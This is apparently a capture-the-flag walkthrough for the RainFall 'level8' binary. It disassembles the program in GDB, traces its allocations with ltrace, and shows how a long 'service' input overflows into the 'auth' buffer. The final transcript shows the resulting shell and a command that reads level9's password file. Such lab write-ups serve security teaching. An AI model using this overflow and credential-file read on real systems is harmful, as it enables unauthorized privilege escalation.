```sh
level8@RainFall:~$ ls -la
total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
level8@RainFall:~$ ./level8
(nil), (nil) 
42
(nil), (nil) 
4242424242424424242424242424242
(nil), (nil) 
^C
level8@RainFall:~$ ./level8 42 42
(nil), (nil) 
42424242424
(nil), (nil) 
2424242rsdanfaslkgnbklfansdklnawe
(nil), (nil) 
```
There is one excutable file **level8**, when run the program, he prints some information and wait standard input, when he take enter, it repeats forever. \
\
Run the binary file with GDB.
```sh
(gdb) info functions
...
0x08048564  main
...
(gdb) disas main
Dump of assembler code for function main:
   0x08048564 <+0>:     push   %ebp
   0x08048565 <+1>:     mov    %esp,%ebp
   0x08048567 <+3>:     push   %edi
   0x08048568 <+4>:     push   %esi
   0x08048569 <+5>:     and    $0xfffffff0,%esp
   ...
   0x08048737 <+467>:   pop    %ebp
   0x08048738 <+468>:   ret    
End of assembler dump.
```
We can find some hint in this big asm, with asm command ```repz cmpsb```.
```sh
(gdb) disas main
   ...
   0x080485bb <+87>:    lea    0x20(%esp),%eax
   0x080485bf <+91>:    mov    %eax,%edx
   0x080485c1 <+93>:    mov    $0x8048819,%eax
   0x080485c6 <+98>:    mov    $0x5,%ecx
   0x080485cb <+103>:   mov    %edx,%esi
   0x080485cd <+105>:   mov    %eax,%edi
   0x080485cf <+107>:   repz cmpsb %es:(%edi),%ds:(%esi)
   0x080485d1 <+109>:   seta   %dl
   0x080485d4 <+112>:   setb   %al
   0x080485d7 <+115>:   mov    %edx,%ecx
   0x080485d9 <+117>:   sub    %al,%cl
   0x080485db <+119>:   mov    %ecx,%eax
   0x080485dd <+121>:   movsbl %al,%eax
   0x080485e0 <+124>:   test   %eax,%eax
   0x080485e2 <+126>:   jne    0x8048642 <main+222>
   ...
```
[cmpsb](https://faydoc.tripod.com/cpu/cmpsb.htm) is compare command byte by byte, [repz](https://www.gladir.com/LEXIQUE/ASM/repz.htm) is repeat instruction parameter(for now is cmpsb) until cx register becomes 0. \
line +93, get the value in eax from the ```0x8048819``` which is
```sh
(gdb) x/s 0x8048819
0x8048819:       "auth " #spacebar is there (5 characters)
```
line +98, ecx get 5, and in the line +107, it compares 2 parameters. \
and line +124, it compares himself, so the result of cmpsb is 0. \
We can represent in c,
```c
 if (strncmp(buffer, "auth ", 5) == 0)
 ```
We can find same pattern at different places, like \
```main+222~259```, ```main+276~313```, ```main+343~374```. \
\
Commands available for the level8 "auth ", "reset", "service", "login".
\
And we can also find what is printed in terminal with ```printf()```,
```sh
   0x08048575 <+17>:    mov    0x8049ab0,%ecx
   0x0804857b <+23>:    mov    0x8049aac,%edx
   0x08048581 <+29>:    mov    $0x8048810,%eax
   0x08048586 <+34>:    mov    %ecx,0x8(%esp)
   0x0804858a <+38>:    mov    %edx,0x4(%esp)
   0x0804858e <+42>:    mov    %eax,(%esp)
   0x08048591 <+45>:    call   0x8048410 <printf@plt>
```
He take 2 arguments ```0x8049ab0```, ```0x8049aac``` which is
```sh
(gdb) x/s 0x8049ab0
0x8049ab0 <service>:     ""
(gdb) x/s 0x8049aac
0x8049aac <auth>:        ""
```
So it was address of global variables ```service``` and ```auth``` ! \
When we use "auth" and "service" command, it will allocate the address for those variables, which are printed instead (nil).
```sh
level8@RainFall:~$ ./level8
(nil), (nil) 
auth
0x804a008, (nil)
```
After we use second command ```service```
```sh
service
0x804a008, 0x804a018 
```
It seem be diffrent addresses of global variables, because
```sh
level8@RainFall:~$ ltrace ./level8 
__libc_start_main(0x8048564, 1, 0xbffff7f4, 0x8048740, 0x80487b0 <unfinished ...>
printf("%p, %p \n", (nil), (nil)(nil), (nil))          = 14
fgets("auth \n", 128, 0xb7fd1ac0)                      = 0xbffff6d0
malloc(4)                                              = 0x0804a008 # here
strcpy(0x0804a008, "\n")                               = 0x0804a008
printf("%p, %p \n", 0x804a008, (nil)0x804a008, (nil))  = 18
fgets("service\n", 128, 0xb7fd1ac0)                    = 0xbffff6d0
strdup("\n")                                           = 0x0804a018 # and here
printf("%p, %p \n", 0x804a008, 0x804a018)              = 22
```
it was allocated by malloc and strdup. \
Now we have both variables allocated at the addresses ```0x804a008```, ```0x804a018```. \
In the main+382, we can see
```sh
(gdb) disas main
   ...
   0x080486e2 <+382>:   mov    0x8049aac,%eax
   0x080486e7 <+387>:   mov    0x20(%eax),%eax
   0x080486ea <+390>:   test   %eax,%eax
   0x080486ec <+392>:   je     0x80486ff <main+411>
   0x080486ee <+394>:   movl   $0x8048833,(%esp)
   0x080486f5 <+401>:   call   0x8048480 <system@plt>
   ...
(gdb) x/s 0x8049aac
0x8049aac <auth>:        ""
(gdb) x/s 0x8048833
0x8048833:       "/bin/sh"
```
its represent in c like,
```c
if (auth[32] != 0) {
	system("/bin/sh");
}
```
But as you can see we can obtain level8's bash if we pass this statement
As long as auth's variable address is at ```0x804a008``` and ```a[32]``` means ```0x804a008 + 32```, which is ```0x804a028``` \
we can simply buffer overflow ```service``` to reach that address and set the value with anything other than 0.
The characters after ```service``` must be longer than 16 because ```strdup``` function takes string from 7's position.
```sh
...
auth 
0x804a008, (nil) 
service1234567890abcdef
0x804a008, 0x804a018
login
$ cat /home/user/level9/.pass
(hidden)
```
level8 passed !